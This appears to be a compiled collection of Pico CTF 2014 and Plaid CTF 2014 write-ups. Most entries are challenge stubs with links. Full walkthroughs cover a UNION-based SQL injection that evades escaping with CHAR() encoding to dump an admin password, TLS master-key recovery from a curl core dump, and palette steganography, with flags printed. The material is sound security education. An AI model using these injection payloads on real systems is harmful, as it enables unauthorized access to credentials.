* <http://ehsandev.com/pico2014/miscellaneous/tyrannosaurus_hex.html>
# Pico CTF 2014 write-ups

* <https://picoctf.com/>
* [Scoreboard](https://picoctf.com/scoreboard)

## Completed write-ups

* [caesar-20](crypto/caesar-20)
* [droid-app-80](forensics/droid-app-80)
* [intercepted-post-40](forensics/intercepted-post-40)
* [the-valley-of-fear-20](crypto/the-valley-of-fear-20)
* [tyrannosaurus-hex-10](miscellaneous/tyrannosaurus-hex-10)
* [this-is-endian-40](binary-exploitation/this-is-endian-40)
* [supercow-40](forensics/supercow-40)
* [snapcat-80](forensics/snapcat-80)

## External write-ups only

* [baleful-200](master-challenge/baleful-200)
* [basic-asm-60](reverse-engineering/basic-asm-60)
* [best-shell-160](binary-exploitation/best-shell-160)
* [bit-puzzle-130](reverse-engineering/bit-puzzle-130)
* [block-130](crypto/block-130)
* [common-vulnerability-exercise-20](miscellaneous/common-vulnerability-exercise-20)
* [crude-crypt-180](binary-exploitation/crude-crypt-180)
* [cyborg-secrets-80](reverse-engineering/cyborg-secrets-80)
* [delicious-60](web-exploitation/delicious-60)
* [easy-overflow-40](binary-exploitation/easy-overflow-40)
* [ecc-100](crypto/ecc-100)
* [execute-me-80](binary-exploitation/execute-me-80)
* [fancy-cache-200](master-challenge/fancy-cache-200)
* [format-70](binary-exploitation/format-70)
* [function-address-60](reverse-engineering/function-address-60)
* [grep-is-still-your-friend-40](forensics/grep-is-still-your-friend-40)
* [guess-75](binary-exploitation/guess-75)
* [hardcore-rop-200](master-challenge/hardcore-rop-200)
* [injection-1-90](web-exploitation/injection-1-90)
* [injection-2-110](web-exploitation/injection-2-110)
* [injection-3-130](web-exploitation/injection-3-130)
* [injection-4-150](web-exploitation/injection-4-150)
* [internet-inspection-30](web-exploitation/internet-inspection-30)
* [javascript-40](web-exploitation/javascript-40)
* [low-entropy-110](crypto/low-entropy-110)
* [make-a-face-100](web-exploitation/make-a-face-100)
* [massive-fail-120](web-exploitation/massive-fail-120)
* [never-note-180](binary-exploitation/never-note-180)
* [netsino-120](reverse-engineering/netsino-120)
* [no-comment-20](web-exploitation/no-comment-20)
* [no-overflow-140](binary-exploitation/no-overflow-140)
* [obfusication-150](reverse-engineering/obfusication-150)
* [obo-90](miscellaneous/obo-90)
* [overflow-1-50](binary-exploitation/overflow-1-50)
* [overflow-2-70](binary-exploitation/overflow-2-70)
* [pickle-jar-30](forensics/pickle-jar-30)
* [png-or-not-100](forensics/png-or-not-100)
* [police-records-140](reverse-engineering/police-records-140)
* [potentially-hidden-password-100](web-exploitation/potentially-hidden-password-100)
* [redacted-50](forensics/redacted-50)
* [repeated-xor-70](crypto/repeated-xor-70)
* [revenge-of-bleichenbacher-170](crypto/revenge-of-bleichenbacher-170)
* [robo-photo-30](miscellaneous/robo-photo-30)
* [rop-1-100](binary-exploitation/rop-1-100)
* [rsa-80](crypto/rsa-80)
* [rsa-mistakes-200](master-challenge/rsa-mistakes-200)
* [secure-page-service-100](web-exploitation/secure-page-service-100)
* [spoof-proof-60](forensics/spoof-proof-60)
* [ssh-backdoor-100](forensics/ssh-backdoor-100)
* [steves-list-200](master-challenge/steves-list-200)
* [substitution-50](crypto/substitution-50)
* [tic-toc-90](reverse-engineering/tic-toc-90)
* [toaster-control-50](web-exploitation/toaster-control-50)
* [towers-of-toast-90](reverse-engineering/towers-of-toast-90)
* [write-right-50](binary-exploitation/write-right-50)
* [what-the-flag-140](binary-exploitation/what-the-flag-140)
* [web-interseption-140](crypto/web-interseption-140)
* [xor-50](crypto/xor-50)

# Pico CTF 2014 : Basic Asm

**Category:** Reverse
**Points:** 60
**Description:**

>We found this program [(snippet)](snippet.txt), but we're having some trouble figuring it out. What's the value of %eax when the last instruction (the NOP) runs?

**Hint:**
>You may want to convert the assembly into some equivalent C code, which will be easier to read!

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/reverse_engineering/basic_asm.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-basic-asm/>
# Pico CTF 2014 : Bit Puzzle

**Category:** Reverse
**Points:** 130
**Description:**

>This program seems to be a puzzle! Can you reverse-engineer it and find the solution to the puzzle?

**Hint:**
>You will probably want to disassemble this program and find the constraints on the input. Then, you might want a constraint solver!

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-bit-puzzle/>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : Cyborg Secrets 

**Category:** Reverse
**Points:** 80
**Description:**

>You found a password protected binary on the cyborg relating to its defensive security systems. Find the password and get the shutdown code! You can find it on the shell server at /home/cyborgsecrets/cyborg-defense or you can download it here.

**Hint:**
>I wonder if they hardcoded the password string.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/reverse_engineering/cyborg_secrets.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-cyborg-secrets/>
# Pico CTF 2014 : Function Address

**Category:** Reverse
**Points:** 60
**Description:**

>We found this program file on some systems. But we need the address of the 'find_string' function to do anything useful! Can you find it for us?

**Hint:**
>objdump or another disassembler may be useful to you. There are only two functions in the binary that are actually created by the user, and one of them is main.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/reverse_engineering/function_address.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-function-address/>
# Pico CTF 2014 : Netsino

**Category:** Reverse
**Points:** 120
**Description:**

>Daedalus seems to have ties to a shady online gambling boss. Maybe if you beat him at his own game, you can persuade him to share some useful info. The server is running on vuln2014.picoctf.com:4547 and the source code can be found here.

**Hint:**
>You can't always win at gambling. But if you can reverse this program and find the bug, you'll find that making money may not be so hard after all.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-netsino/>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : Obsufication

**Category:** Reverse
**Points:** 150
**Description:**

>You find a thumbdrive loaded with a strange binary. It seems to be asking for a password... Can you find it?

**Hint:**
>You'll probably want a debugger to analyze this program - regular disassembly may be hard!

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-obfuscation/>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : Police Records

**Category:** Reverse
**Points:** 140
**Description:**

>A Theseus double agent has infiltrated the police force but the police won't give you access to their directory information. Thankfully you found the source code to their directory server. Write a client to interact with the server and find the duplicated badge number! The flag is the badge number.
The server is running on vuln2014.picoctf.com:21212.

**Hint:**
>You are going to have to understand structs.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/reverse_engineering/police_records.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-police-records/>
# Pico CTF 2014 : Tic Tock

**Category:** Reverse
**Points:** 90
**Description:**

>These clocks seem rather... odd. Do you have what it takes to make them all line up? Source Code

**Hint:**
>This problem is 100% math. Look up modular arithmetic if you aren't already familiar with it.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-tick-tock/>
# Pico CTF 2014 : Towers Of Toast

**Category:** Reverse
**Points:** 90
**Description:**

>Everyone loves the Tower of Hanoi puzzle. Well it appears the Toaster Bot wants you to play an essentially identical game called "Towers of Toast". The game doesn't seem to be working though... Can you win anyway? Perhaps by loading a winning saved game? Download the Java code here.

**Hint:**
>Remember that all numbers have a unique set of Prime Factors.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/reverse_engineering/towers_of_toast.html>
# Pico CTF 2014 : Delicious

**Category:** Web Exploitation
**Points:** 60
**Description:**

>You have found the administrative control panel for the Daedalus Coperation Website: https://web.picoctf.com/delicious-5850932/login.php. Unfortunately, it requires that you be logged in. Can you find a way to convince the web site that you are, in fact, logged in?

**Hint:**
>Your cookie tells the site what your session number is. Maybe you can guess the value of the cookie for a user who's already logged in...

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/web_exploitation/delicious.html>
# Pico CTF 2014 : Injection 1

**Category:** Web Exploitation
**Points:** 90
**Description:**

>Daedalus Corp. has been working on their login service, using a brand new SQL database to store all of the access credentials. Can you figure out how to login?
http://web2014.picoctf.com/injection1/

**Hint:**
>What happens if username or password contains a single quote (')?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/web_exploitation/injection_1.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-injection1/>
# Pico CTF 2014 : Injection 2

**Category:** Web Exploitation
**Points:** 110
**Description:**

>Daedalus Corp.'s login woes continue. Can you sign in using their latest login system?
http://web2014.picoctf.com/injection2/

**Hint:**
>If only we could make the query return a fake row that we control...

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/web_exploitation/injection_2.html>
# Pico CTF 2014 : Injection 3

**Category:** Web Exploitation
**Points:** 130
**Description:**

>Daedalus Corp. has increased the security of their login prompt. Is it possible to work around their new defenses?
 http://web2014.picoctf.com/injection3/

**Hint:**
>Pretend the mysqli_real_escape_string in lookup_user.php isn't there and try doing your standard UNION SQL injection. What does the query end up looking like?

## Write-up

In the site index.php we are presented with a login form that takes a username and a password.

The source code for that is also given:

```
<?php
include "config.php";
$con = mysqli_connect("localhost", "sql3", "sql3", "sql3");
$username = mysqli_real_escape_string($con, $_POST["username"]);
$password = mysqli_real_escape_string($con, $_POST["password"]);
$query = "SELECT * FROM ${table_prefix}users WHERE username='$username' AND password='$password'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) === 1) {
  $row = mysqli_fetch_array($result);
  echo "<h1>Logged in!</h1>";
  if ($row["username"] === "admin") {
    echo "<p>Your flag is: $FLAG</p>";
  } else {
    echo "<p>Only admin can see the flag.</p>";
  }
} else {
  echo "<h1>Login failed.</h1>";
}
?>
```

There doesn't seem to be some visible sql injection there but there is a link on the page below for the /lookup_user.php?id=1 page which when loaded contains the following:

```
User info for admin
Display name: Admin
Location: Pittsburgh
E-mail: admin@admin.me

View source
```

The source code of lookup_user.php is:

```
<?php
include "config.php";
$con = mysqli_connect("localhost", "sql3", "sql3", "sql3");
// ID is escaped, so this must be safe, right?
$id = mysqli_real_escape_string($con, $_GET["id"]);

if (intval($_GET["debug"])) {
  echo "<pre>";
  echo "id: ", htmlspecialchars($id);
  echo "</pre>";
}

$query = "SELECT * FROM ${table_prefix}users WHERE id=$id";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) !== 1) {
  die("<p>Could not find user.</p>");
}

$row = mysqli_fetch_array($result);
echo "<pre>";
echo "User info for ", htmlspecialchars($row["username"]), "\n";
echo "Display name: ", htmlspecialchars($row["display_name"]), "\n";
echo "Location: ", htmlspecialchars($row["location"]), "\n";
echo "E-mail: ", htmlspecialchars($row["email"]), "\n";
echo "</pre>";
echo '<a href="lookup_user.phps">View source</a>';
?>
```

As in the injection-2 challenge there is a debug flag to show us the query we have inputed in id= and it requires a single row to be returned.

We can start simple by changing `id=1` to `id=1 OR 0=1`. The second query doesn't fail so there is a possibility to inject SQL statements.

We could immediately try a UNION SELECT .... FROM ${table_prefix}users but we don't know the table prefix.

By quickly searching you can see that the information_schema.TABLES table in mysql contains the table names contained in the database. We also know that our table ends in "\*users". If we ignore the `mysqli_real_escape_string` for a moment and assume that no filtering is done in our input then our normal query that would give us the \*users table would look like this

```
id=1 AND 1=0 UNION SELECT TABLE_NAME AS username, TABLE_NAME AS location, TABLE_NAME as password2, TABLE_NAME as password3, TABLE_NAME as password, TABLE_NAME AS email, TABLE_NAME as display_name FROM information_schema.TABLES WHERE TABLE_NAME LIKE "%users" LIMIT 1
```

We invalidate the results of the first SELECT statement by adding the `AND 1=0`, do a UNION SELECT with some extra columns (7 in total) to match the number of columns in the ${table_prefix}users (we can find that with quick trial and error by adding columns one-by-one) and finally we LIMIT the results to 1 so that it passes the if check in the php code.

The issue here is that the `mysqli_real_escape_string` function escapes the " and turns it to a \" in the query and thus the page returns a `Could not find user.`. 

We can avoid that check by encoding the double quotes with `CONCAT(CHAR(37), CHAR(117), CHAR(115), CHAR(101), CHAR(114), CHAR(115))`. The CHAR() function turns the numbers to their ascii encoding and the concat turns all the characters to a string surrounded with double quotes. The end result of this CONCAT will be "%users".

So if we try

```
http://web2014.picoctf.com/injection3/lookup_user.php?debug=1&id=1 AND 1=0 UNION SELECT TABLE_NAME AS username, TABLE_NAME AS location, TABLE_NAME as password2, TABLE_NAME as password3, TABLE_NAME as password, TABLE_NAME AS email, TABLE_NAME as display_name FROM information_schema.TABLES WHERE TABLE_NAME LIKE CONCAT(CHAR(37), CHAR(117), CHAR(115), CHAR(101), CHAR(114), CHAR(115)) LIMIT 1
```

We get

```
User info for super_secret_users
Display name: super_secret_users
Location: super_secret_users
E-mail: super_secret_users
```

Therefore our users table is `super_secret_users`.

Now all we need is to do a UNION SELECT with tha table to get the Admins password and use that to login.

We try:

```
http://web2014.picoctf.com/injection3/lookup_user.php?debug=1&id=1 AND 0=1 UNION SELECT username, password AS location, username as password2, username as password, username as password, username AS email, username as display_name FROM super_secret_users LIMIT 1
```

and get

```
User info for not_the_flag_super_secret_admin_password
Display name: admin
Location: admin
E-mail: admin
```

The password is `not_the_flag_super_secret_admin_password` and if you use that to login in the initial login.php you get the flag `flag_2tc7ZPa5PEhcyZJXgH`.

## Other write-ups and resources

* none yet
# Pico CTF 2014 : Injection 4

**Category:** Web Exploitation
**Points:** 150
**Description:**

>Daedalus Corp. has once again improved their login service. They're so confident, in fact, that they added a new registration feature. Can you find a way to login as 'admin'?
 http://web2014.picoctf.com/injection4/

**Hint:**
>Can you leak out any information using SQL injection?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/web_exploitation/injection_4.html>
# Pico CTF 2014 : Internet Inspection

**Category:** Web Exploitation
**Points:** 30
**Description:**

>On his computer, your father left open a browser with the Thyrin Lab [Website](https://picoctf.com/api/autogen/serve/index.html?static=false&pid=28baa70afa1967ff63b201f687b7533e). Can you find the hidden access code?

**Hint:**
>It may be helpful to learn how to 'Inspect Elements' in your browser.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/web_exploitation/internet_inspection.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-internet-inspection/>
# Pico CTF 2014 : Javascript

**Category:** Web Exploitation
**Points:** 40
**Description:**

>Tyrin Robotics Lab uses a special web [site](https://picoctf.com/api/autogen/serve/index.html?static=false&pid=b1d725db54a1fb027ea6bbd78f9a7d0b) to encode their secret messages. Can you determine the value of the secret key?

**Hint:**
>You may want to learn how to use you browser's JavaScript console.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-javascrypt/>
# Pico CTF 2014 : Make A Face

**Category:** Web Exploitation
**Points:** 100
**Description:**

>It looks like Daedalus is working on a new project to generate digital avatars for use online. After taking a look, at their site: http://makeaface.picoctf.com/ it seems like there is a pretty good chance the project isn't completed, and may have some bugs. This might be the break we've been looking for to get inside their network.

**Hint:**
>Making a face is cool, but making a shell is even better

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/web_exploitation/make_a_face.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-make-a-face/>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : Massive Fail

**Category:** Web Exploitation
**Points:** 120
**Description:**

>Fed up with their recent PHP related issues, Daedalus Corp. has switched their website to run on Ruby on Rails (version 3.1.0) instead. Their brand new registration page does not seem like much of an improvement though... [Source](http://web2014.picoctf.com:5000/user/register).

**Hint:**
>The source code files app/controllers/user_controller.rb and db/schema.rb are particularly interesting.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-massive-fail/>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : No Comment

**Category:** Web Exploitation
**Points:** 20
**Description:**

>The CD you find has a copy of your father's website: [homepage.html](https://picoctf.com/api/autogen/serve/homepage.html). Maybe something is hidden in the site...


**Hint:**
>You may want to use your browser to view the source of the web page.

## Write-up

(TODO)

## Other write-ups and resources

* <https://picoctf.wordpress.com/2014/11/10/no-comment-20-picoctf-2014-writeup/>
* <http://ehsandev.com/pico2014/web_exploitation/no_comment.html>
# Pico CTF 2014 : Potentially Hidden Password

**Category:** Web Exploitation
**Points:** 100
**Description:**

>This Daedalus Corp. website loads images in a rather odd way... [Source Code]

**Hint:**
>The 'file_loader.php' page might be able to serve more than just images.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/web_exploitation/potentially_hidden_password.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-potentially-hidden-password/>
# Pico CTF 2014 : Secure Page service 

**Category:** Web Exploitation
**Points:** 100
**Description:**

>The bad guys have hidden their access codes on an anonymous secure page service. Our intelligence tells us that the codes was posted on a page with id 43440b22864b30a0098f034eaf940730ca211a55, but unfortunately it's protected by a password, and only site moderators can view the post without the password. Can you help us recover the codes?

**Hint:**
>What happens if you put HTML into a page?

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/web_exploitation/secure_page_service.html>
# Pico CTF 2014 : Toaster Control

**Category:** Web Exploitation
**Points:** 50
**Description:**

>Daedalus Corp. uses a web interface[1] to control some of their toaster bots. It looks like they removed the command 'Shutdown & Turn Off' from the control panel. Maybe the functionality is still there...
http://web2014.picoctf.com/toaster-control-1040194/

**Hint:**
>Some symbols need to be [URL Encoded](http://en.wikipedia.org/wiki/Percent-encoding) when included in [GET](http://www.w3schools.com/tags/ref_httpmethods.asp) requests.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-toastercontrol/>
# Plaid CTF 2014: bbos

**Category:** Forensics
**Points:** 100
**Description:**

> You have traveled back in time, but look, hunting The Plague is tough. You're really just going back to relax for a while without having to worry about all that nonsense. As you walk in the park you stumble across someone's BlackBerry. Wow, people still use BlackBerry phones (time travel gets so confusing)? You figure you should return it to the owner, but you have a hard time getting inside. Figure out what's on [the phone](https://mega.co.nz/#!ulIEhCpQ!FlmQ9o4y_msfk3hUzqIw6vFGzrfVFWUQGqJRRJlrzfI), and maybe we'll be able to return it to the rightful owner.

## Write-up

(TODO)

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-for350-bbos.html>
* <https://ctftime.org/writeup/1107>
# Plaid CTF 2014: bronies

**Category:** Web
**Points:** 500
**Description:**

> We are trying to break into eXtreme Secure Solutions, where The Plague works as a system adminstrator. We have found that their internal company login page is at <http://portal.essolutions.largestctf.com/>. Recon has also revealed that The Plague likes to browse this site during work hours: <http://54.196.225.30/> using the username `ponyboy2004`.
> Remember, our main target is to break into the company portal, *not* the pony site.
>
> UPDATE: The SQL injection was not intentional and does not help you solve the problem. We believe it has been fixed. If you have questions, please ask ricky on #pctf @ sendak.freenode.net.
> UPDATE2: Also, bronies is not intended to be solved via client side (e.g. WebKit) exploits - if you manage to do so though, that's fair game.
> UPDATE3: Bronies was broken until 2013-04-13 07:26:28 UTC (the admin wasn't logging onto the internal portal properly). Please retry your exploits.
> UPDATE4: Sorry, once again, please retry your bronies part 1 exploits. We think we fixed a bug at 2013-04-13 08:33:30 UTC that was breaking some attempts.
>
> Hint: just to clarify, both flags for bronies are behind the login page - the pony site doesn't have any flags in it.

## Write-up

(TODO)

The first flag is `xss_problem_is_web_problem`. The second flag is `WEB_you_hacked_the_bigson_WEB`.

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-web800-bronies.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/bronies)
# Plaid CTF 2014: curlcore

**Category:** Forensics
**Points:** 250
**Description:**

> We managed to grab a [memory dump](curlcore-b9b2bc016a796db9db66be6365d48a6b.tar.bz2) off of The Plague’s computer while he was making a secure download. We think he may have been looking for new places to hide the Prime Factorizer. Can you figure out what messages were sent through his computer?

## Write-up

Unzip [the provided tarball](curlcore-b9b2bc016a796db9db66be6365d48a6b.tar.bz2). This results in the following file/directory structure:

```bash
$ tree
.
├── curlcore.sh
├── lib
│   └── x86_64-linux-gnu
│       ├── ld-2.17.so
│       ├── libc-2.17.so
│       ├── libcom_err.so.2.1
│       ├── libcrypt-2.17.so
│       ├── libcrypto.so.1.0.0
│       ├── libdl-2.17.so
│       ├── libgcrypt.so.11.7.0
│       ├── libgpg-error.so.0.10.0
│       ├── libkeyutils.so.1.4
│       ├── libnsl-2.17.so
│       ├── libnss_compat-2.17.so
│       ├── libnss_files-2.17.so
│       ├── libnss_nis-2.17.so
│       ├── libpthread-2.17.so
│       ├── libresolv-2.17.so
│       ├── libssl.so.1.0.0
│       └── libz.so.1.2.8
├── tmp
│   ├── capture
│   ├── corefile
│   └── coremaps
└── usr
    ├── bin
    │   └── curl
    └── lib
        └── x86_64-linux-gnu
            ├── libasn1.so.8.0.0
            ├── libcurl.so.4.3.0
            ├── libgnutls.so.26.22.6
            ├── libgssapi.so.3.0.0
            ├── libgssapi_krb5.so.2.2
            ├── libhcrypto.so.4.1.0
            ├── libheimbase.so.1.0.0
            ├── libheimntlm.so.0.1.0
            ├── libhx509.so.5.0.0
            ├── libidn.so.11.6.11
            ├── libk5crypto.so.3.1
            ├── libkrb5.so.26.0.0
            ├── libkrb5.so.3.3
            ├── libkrb5support.so.0.1
            ├── liblber-2.4.so.2.8.3
            ├── libldap_r-2.4.so.2.8.3
            ├── libp11-kit.so.0.0.0
            ├── libroken.so.18.1.0
            ├── librtmp.so.0
            ├── libsasl2.so.2.0.25
            ├── libsqlite3.so.0.8.6
            ├── libtasn1.so.3.2.0
            └── libwind.so.0.0.0

7 directories, 45 files
```

`curlcore.sh` is a shell script that was used to create the tarball. It contains this piece of code:

```bash
sleep 1
OUTPUT="`/usr/bin/env -i /bin/dash -c 'ulimit -c unlimited; curl -k https://curlcore.local.plaidctf.com/flag.html & PID=$!; sleep 5; printf "generate-core-file\ninfo proc mappings\ndetach\n" | sudo gdb attach $PID; wait'`"
sleep 1
```

Apparently, `https://curlcore.local.plaidctf.com/flag.html` was requested while the dump was created. The flag we’re looking for is probably part of the response.

Open `tmp/capture` in Wireshark. It shows that `https://curlcore.local.plaidctf.com/flag.html` was indeed requested, but since it was downloaded over HTTPS the plain text response isn’t available as part of the capture. We _do_ know that `TLS_RSA_WITH_AES_256_CBC_SHA` is used, i.e. the data is encrypted with AES-256 and the key is exchanged using basic RSA encryption. Wireshark also displays the RSA session ID, `19AB5EDC02F097D5074890E44B483A49B083B043682993F046A55F265F11B5F4`:

![](wireshark-capture.png)

Now that we have the session ID, [we could decrypt the entire session if we also had the SSL master secret](http://www.cloudshield.com/blog/advanced-malware/how-to-decrypt-openssl-sessions-using-wireshark-and-ssl-session-identifiers/):

![Wireshark → Edit → Preferences → Protocols → SSL](wireshark-ssl-master-secret-log-format.png)

But where could we find this SSL master key? `curl` depends on OpenSSL for TLS support… So [let’s see how OpenSSL stores the SSL master key in memory](https://github.com/openssl/openssl/blob/300b9f0b704048f60776881f1d378c74d9c32fbd/ssl/ssl.h#L586-L590).

```h
struct ssl_session_st
  {
  // […]
  int master_key_length;
  unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH];
  /* session_id - valid? */
  unsigned int session_id_length;
  unsigned char session_id[SSL_MAX_SSL_SESSION_ID_LENGTH];
  // […]
}
```

Turns out the SSL master key is close to the session ID, in the same struct.

Let’s see if the session ID occurs in any of the other files:

```bash
$ grep '\x19\xAB\x5E\xDC\x02\xF0\x97\xD5\x07\x48\x90\xE4\x4B\x48\x3A\x49\xB0\x83\xB0\x43\x68\x29\x93\xF0\x46\xA5\x5F\x26\x5F\x11\xB5\xF4' -r .
Binary file ./tmp/capture matches
Binary file ./tmp/corefile matches
```

A-ha, `tmp/corefile` also contains the session ID. Let’s look near the session ID in this file, for anything that might be the SSL master key for the connection.

```bash
$ hexdump -C tmp/corefile | grep --before=5 --after=3 '19 ab 5e dc'
0004fbc0  20 20 00 00 00 00 00 00  70 01 00 00 00 00 00 00  |  ......p.......|
0004fbd0  01 03 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0004fbe0  30 00 00 00 19 1e 50 42  e6 b3 13 71 aa 65 25 8e  |0.....PB...q.e%.|
0004fbf0  13 b2 dc 71 4d 98 4d f8  d6 8f ad 67 8f f0 a2 fc  |...qM.M....g....|
0004fc00  49 47 6d 65 c3 a1 61 f7  18 57 2c 3f 5d b8 56 6a  |IGme..a..W,?].Vj|
0004fc10  0d e8 9e 58 20 00 00 00  19 ab 5e dc 02 f0 97 d5  |...X .....^.....|
0004fc20  07 48 90 e4 4b 48 3a 49  b0 83 b0 43 68 29 93 f0  |.H..KH:I...Ch)..|
0004fc30  46 a5 5f 26 5f 11 b5 f4  00 00 00 00 00 00 00 00  |F._&_...........|
0004fc40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
```

And indeed: right before the session ID, starting with `19 1e 50 42` and ending with `0d e8 9e 58` there is something that might be a valid master key (consisting of exactly `96` hexadecimal digits).

Let’s write the session ID and this master key to [a file in the format described by Wireshark](session-master-secret.log):

```
RSA Session-ID:19AB5EDC02F097D5074890E44B483A49B083B043682993F046A55F265F11B5F4 Master-Key:191E5042E6B31371AA65258E13B2DC714D984DF8D68FAD678FF0A2FC49476D65C3A161F718572C3F5DB8566A0DE89E58
```

Go to Wireshark → Edit → Preferences → Protocols → SSL and select the `session-master-secret.log` file in the (Pre-)Master-Secret log filename input field.

After that, you can right-click on any TLS/SSL packet and select ‘Follow SSL Stream’ to view the decoded payload.

![](wireshark-flag.png)

The flag is `congratz_you_beat_openssl_as_a_whitebox`.

## Other write-ups and resources

* <https://cesena.ing2.unibo.it/2014/04/14/plaidctf-2014-curlcore-forensic-250/>
* <https://fail0verflow.com/blog/2014/plaidctf2014-for250-curlcore.html>
* <https://docs.google.com/a/google.com/file/d/0B1Q3-q0eaImNSlNJbTNKVzNtV3c/edit>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/forensics/curlcore)
* [Indonese](http://blog.rentjong.net/2014/04/plaidctf2014-write-up-curlcore.html)
* <http://j00ru.vexillium.org/dump/ctf/curlcore.zip>
# Plaid CTF 2014: doge_stege

**Category:** Forensics
**Points:** 100
**Description:**

> You were startled to learn the The Plague has been behind many of the most popular internet memes. We believe he hides information in these funny pictures with steganography in order to broadcast his messages through time without detection. Find the [hidden message](doge_stege-bcea78ed7ce3588f89b56f125866c1e2.tar.bz2), stop the signal.

## Write-up

_This write-up is made by Steven of the [HacknamStyle](http://hacknamstyle.net/) CTF team._

Inspecting the PNG shows:

```bash
$ file doge_stege.png
doge_stege.png: PNG image data, 680 x 510, 8-bit colormap, non-interlaced
```

An 8-bit colormap is a typical place where things are hidden in a steganography challenge. After some lazy searching, we find a tool to change the palette (or colormap) of a PNG using Python [on Stack Overflow](http://stackoverflow.com/a/1214765/96656).

[`change_palette.py`](change_palette.py) is modified to allow us to write out 256 images, each one highlighting a single entry in white while blacking out the others:

```bash
$ for i in {0..255}; do ./change_palette.py doge_stege.png "single-color-${i}.png" "${i}"; done
```

All the resulting images can be found in [`single.tar.gz`](single.tar.gz). Going through these images, we notice that on `single-color-127.png`, some unseen text appears:

![](single-color-127.png)

Other images show similar fragments of text. Clearly, the message is composed of multiple entries in the colormap. [`change_palette.py`](change_palette.py) is modified again (uncomment the correct line) to now highlight a range of colormap entries starting from `127` onwards:

```bash
$ for i in {0..128}; do ./change_palette.py doge_stege.png "range-color-127+${i}.png" "${i}"; done
```

All these images can be found in [`range.tar.gz`](range.tar.gz). In e.g. `range-color-127+54.png`, the full message becomes readable:

![](range-color-127+54.png)

The flag is `pctf{keep\_doge\_alive\_2014}`.

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-plaidctf-2014-doge-stege/>
* <http://csrc.tamuc.edu/css/?p=156>
* <https://cesena.ing2.unibo.it/2014/04/14/plaidctf-2014-doge_stege-forensic-100/>
* <https://fail0verflow.com/blog/2014/plaidctf2014-for100-doge_stege.html>
* <https://github.com/hackerclub/writeups/blob/master/plaidctf-2014/doge_stege/WRITEUP-pipecork.md>
* <https://ucs.fbi.h-da.de/writeup-plaidctf-2014-doge-stege/>
* [Indonese](http://blog.rentjong.net/2014/04/plaidctf2014-write-up-dogestege.html)
# Plaid CTF 2014: ezhp

**Category:** Pwnables
**Points:** 200
**Description:**

> Luckily when you travel back in time, you still get to use all your knowledge from the present. With that knowledge in hand, breaking into [this service](ezhp-b502addeb274f41757555c05b08e3b05.tar.bz2) (at 54.81.149.239:9174) owned by The Plague shouldn't be hard at all.
>
> Hint: the heap allocator is *really, really bad*.

## Write-up

(TODO)

## Other write-ups and resources

* <http://x86overflow.blogspot.com/2014/04/plaidctf-pwnable-200-ezhp.html>
* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug>
* <https://fail0verflow.com/blog/2014/plaidctf2014-pwn200-ezhp.html>
* [Solution in Perl](https://github.com/t00sh/ctf/blob/master/plaidctf_2014/ezhp.pl)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/ezhp)
* <http://tasteless.eu/2014/04/plaidctf-2014-ezhp-writeup/>
* <https://docs.google.com/document/d/19Tpc7skiAJCof-rQgwQQN1uZ6baq0KW4Ag910RybCC4/edit?pli=1>
* <http://pastebin.com/uAdsSBbQ>
# Plaid CTF 2014: Freya

**Category:** Misc
**Points:** 250
**Description:**

